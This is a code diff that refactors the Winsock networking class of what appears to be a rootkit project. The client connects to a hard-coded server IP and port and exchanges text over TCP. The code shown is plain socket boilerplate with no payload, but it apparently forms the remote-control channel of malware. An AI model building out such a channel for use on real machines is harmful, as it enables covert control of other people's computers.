@@ -21,28 +21,25 @@ bool Network::RootkitClient::connect_to_server() {
 	InetPtonA(AF_INET, Network::SERVER_IP , &(server.sin_addr));
 	//server.sin_addr.s_addr = inet_addr(ipaddress.c_str());
 	server.sin_family = AF_INET;
-	server.sin_port = htons(this->m_port);
-	return connect(this->m_server_socket, (const sockaddr*)&server, sizeof(server)) == 0;
+	server.sin_port = htons(m_port);
+	return connect(m_server_socket, (const sockaddr*)&server, sizeof(server)) == 0;
 
 }
 
-Network::RootkitClient::RootkitClient() {
-	this->m_wsa = Network::WrapWSA();
-
-	this->m_port = Network::SERVER_PORT;
-
-	this->m_server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+Network::RootkitClient::RootkitClient(): m_port(Network::SERVER_PORT){
+	m_wsa = Network::WrapWSA();
+	m_server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
 	std::cout << "checking got socket...\n";
 
 
-	if (this->m_server_socket == INVALID_SOCKET)
+	if (m_server_socket == INVALID_SOCKET)
 		throw std::exception("Couldn't open socket");
 
 	std::cout << "trying init\n";
 
 
-	bool status = this->connect_to_server();
+	bool status = connect_to_server();
 
 
 	if (!status)
@@ -56,8 +53,8 @@ Network::RootkitClient::~RootkitClient() {
 
 	std::cout << "closing socket.\n";
 
-	closesocket(this->m_server_socket);
-	this->m_wsa.cleanup();
+	closesocket(m_server_socket);
+	m_wsa.cleanup();
 }
 
 
@@ -69,7 +66,7 @@ bool Network::RootkitClient::ReceiveText(std::string& text) {
 
 	if (bytes_recived == SOCKET_ERROR) {
 		std::cout << "SOCKET ERROR! errorcode:";
-		std::cout << this->m_wsa.getError() << "\n";
+		std::cout << m_wsa.getError() << "\n";
 		return false;
 	}
 	std::cout << recived_buffer << "\n";
@@ -86,7 +83,7 @@ bool Network::RootkitClient::SendText(std::string& text) {
 
 	if (bytes_recived == SOCKET_ERROR) {
 		std::cout << "SOCKET ERROR! errorcode:";
-		std::cout << this->m_wsa.getError() << "\n";
+		std::cout <<m_wsa.getError() << "\n";
 		return false;
 	}
 
